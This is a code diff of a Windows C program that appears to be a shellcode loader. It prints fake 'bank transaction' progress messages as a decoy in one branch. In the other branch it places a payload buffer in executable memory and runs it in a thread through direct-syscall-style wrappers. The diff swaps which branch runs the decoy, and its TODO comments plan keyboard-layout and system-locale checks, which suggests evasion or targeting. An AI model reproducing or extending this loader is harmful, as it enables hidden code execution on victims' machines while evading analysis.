@@ -46,9 +46,27 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     }
 
     // Other checks todo
+    // GetKeyboardLayout(0)
+    // GetSystemDefaultLCID()    
+    // GetSystemDefaultLangID()
+    // GetSystemDefaultUILanguage()
+    // 
     
-    
-    if (money_spent == 0) {
+    if (money_spent) {
+        int min_delay = 300;
+        int max_delay = 800;
+        int delay;
+        fprintf(file, "Transaction is starting ...\n");
+        for (int i = 0; i < 100; i+=12) {
+            fprintf(file, "Transaction in progress (%d%%), please wait ...\n", i);
+            delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
+            Sleep(delay);
+        }
+        fprintf(file , "Transaction in progress (100%%), please wait ...\n");
+        fprintf(file, "Transaction completed, you sent 1 peso to Elon Musk\n");
+        fprintf(file, "Bank is closed, we hope to see you soon !\n");
+        fclose(file);
+    } else {
         SIZE_T regionSize = sizeof(payload);
         PVOID exec = NULL;
         DWORD old_protect = 0;
@@ -80,20 +98,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         
         // Waiting for thread to finish
         _NtWaitForSingleObj(th, false, NULL);
-    } else {
-        int min_delay = 300;
-        int max_delay = 800;
-        int delay;
-        fprintf(file, "Transaction is starting ...\n");
-        for (int i = 0; i < 100; i+=12) {
-            fprintf(file, "Transaction in progress (%d%%), please wait ...\n", i);
-            delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
-            Sleep(delay);
-        }
-        fprintf(file , "Transaction in progress (100%%), please wait ...\n");
-        fprintf(file, "Transaction completed, you sent 1 peso to Elon Musk\n");
-        fprintf(file, "Bank is closed, we hope to see you soon !\n");
-        fclose(file);
     }
 
     return 0;
